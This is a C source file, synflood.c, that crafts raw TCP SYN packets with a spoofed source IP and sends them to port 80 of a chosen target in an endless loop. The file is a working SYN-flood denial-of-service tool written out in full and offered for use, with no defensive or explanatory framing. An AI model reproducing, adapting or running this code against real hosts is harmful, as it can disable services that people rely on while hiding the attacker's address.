// reference: https://gist.github.com/yorickdewid/a6e4f7181bfcb6aad5cc
/*
 * ---------------------------  synflood.c  ---------------------------------
 *
 * Copyright (c) 2015, Yorick de Wid <yorick17 at outlook dot com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 *   * Redistributions of source code must retain the above copyright notice,
 *     this list of conditions and the following disclaimer.
 *   * Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *   * Neither the name of Redis nor the names of its contributors may be used
 *     to endorse or promote products derived from this software without
 *     specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 */

#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <errno.h>
#include <signal.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>

static unsigned long long int cnt = 0;

struct pseudo_header {
	u_int32_t source_address;
	u_int32_t dest_address;
	u_int8_t placeholder;
	u_int8_t protocol;
	u_int16_t tcp_length;
};
 
unsigned short csum(unsigned short *ptr, int nbytes)  {
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum = 0;
	while(nbytes>1) {
		sum += *ptr++;
		nbytes -= 2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((u_char*)&oddbyte) =* (u_char*)ptr;
		sum += oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;

	return(answer);
}

void inthandler(int sig) {
	printf("Packets sent %lu\n", cnt);
	signal(sig, SIG_IGN);
	exit(0);
}

int main(int argc, char *argv[]) {

	if (argc < 3) {
		fprintf(stderr, "Usage: %s [DST] [SRC]\n", argv[0]);
		return 1;
	}

	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	if(!s) {
		perror("Failed to create socket, u no root?");
		exit(1);
	}

	char datagram[4096], source_ip[32], *data, *pseudogram;
	memset(datagram, 0, 4096);
	 
	struct iphdr *iph = (struct iphdr *)datagram;
	 
	struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct ip));
	struct sockaddr_in sin;
	struct pseudo_header psh;
	 
	data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
	strcpy(data, "vfOGkWFjxlICSmuiNLXQeMKEVzPysnUdDYZBHcrJaoqRAbwtghTp"
				"HTtfCaiGRJbBzEYWOSFuNokcqjxpwdZlvPDrIneUmgXsVyLMhQKA");
	 
	strcpy(source_ip, argv[2]);
	sin.sin_family = AF_INET;
	sin.sin_port = htons(80);
	sin.sin_addr.s_addr = inet_addr(argv[1]);
	 
	// ip head
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data);
	iph->id = htonl(54321);
	iph->frag_off = 0;
	iph->ttl = 255;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0;
	iph->saddr = inet_addr(source_ip); // spoof the source addt
	iph->daddr = sin.sin_addr.s_addr;
	 
	iph->check = csum((unsigned short *)datagram, iph->tot_len);
	 
	// tcp head
	tcph->source = htons(1234);
	tcph->dest = htons(80);
	tcph->seq = 0;
	tcph->ack_seq = 0;
	tcph->doff = 5;  //tcp head sz
	tcph->fin = 0;
	tcph->syn = 1;
	tcph->rst = 0;
	tcph->psh = 0;
	tcph->ack = 0;
	tcph->urg = 0;
	tcph->window = htons(5840);
	tcph->check = 0;
	tcph->urg_ptr = 0;
	 
	psh.source_address = inet_addr(source_ip);
	psh.dest_address = sin.sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data) );
	 
	int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
	pseudogram = malloc(psize);
	 
	memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
	memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + strlen(data));
	 
	tcph->check = csum((unsigned short*)pseudogram , psize);
	 
	int one = 1;
	const int *val = &one;
	 
	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0) {
		perror("Error setting IP_HDRINCL");
		exit(0);
	}

	signal(SIGINT, inthandler);

	// Start the tsumani.....
	while (1) {
		if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin))<0) {
			perror("sendto failed");
			return 1;
		} else {
			if (cnt%1000000==0)
				printf("Packet Send. Length: %d %luM\n", iph->tot_len, (cnt/1000000));
			++cnt;
		}
	}
	 
	return 0;
}
